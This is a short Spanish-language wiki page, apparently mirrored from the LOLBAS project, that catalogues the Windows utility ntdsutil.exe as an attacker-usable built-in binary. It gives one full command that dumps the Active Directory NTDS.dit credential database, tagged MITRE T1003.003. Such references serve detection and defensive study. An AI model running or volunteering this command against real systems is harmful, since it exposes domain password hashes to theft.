# LOLBAS: ntdsutil.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Dump`

Command line utility used to export Active Directory.

## Comandos

### Dumping of Active Directory NTDS.dit database

Dump · priv: Administrator · T1003.003

```cmd
ntdsutil.exe "ac i ntds" "ifm" "create full c:\" q q
```

Dump NTDS.dit into folder

